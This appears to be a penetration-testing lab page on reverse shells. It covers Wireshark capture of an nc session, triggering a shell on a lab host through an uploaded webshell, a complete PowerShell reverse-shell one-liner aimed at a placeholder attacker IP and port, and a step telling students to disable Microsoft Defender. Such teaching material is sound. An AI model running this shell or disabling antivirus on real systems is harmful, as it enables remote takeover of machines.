# Reverse Shells

**Traffic Analysis of bash reverse shell**

**Deliverable 1.** Run wireshark, create a capture filter on 4449/tcp and capture a command or two entered through the nc session. Provide a screenshot showing the followed tcp stream, similar to the screenshot below.

<figure><img src=".gitbook/assets/Screenshot 2025-03-06 185955.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

**Deliverable 2.** Try this out on Pippen by leveraging an uploaded webshell or reverse shell on pippen to run a similar command to connect back to a listener. You may need to upload a small shell script to make this happen, particularly if you are using the simple-backdoor.php script. Provide a screenshot similar to the one below that shows you invoking the reverse shell on the target via curl or your web browser and catching the connection on your kali box.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Windows Powershell Reverse Shell**

**References**

●  https://book.hacktricks.xyz/shells/shells/windows

The following powershell code is run via cmd.exe.  Change ATTACKERIP and ATTACKERPORT to the eth0 IP on kali and port you assigned to a nc listener.

| powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKERIP',ATTACKERPORT); $stream = $client.GetStream();\[byte\[]]$bytes = 0..65535\|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){;$data= (New-Object -TypeName System.Text.ASCIIENcoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 \| Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

**Microsoft Defender to the Rescue**

Microsoft Defender is an outstanding antivirus platform and it knows we are up to no good, in order to progress with the example we will need to turn off AV protection. Figure out how to do this.  We will need to consider Microsoft Defender and other host based protections in our penetration testing efforts.\
\
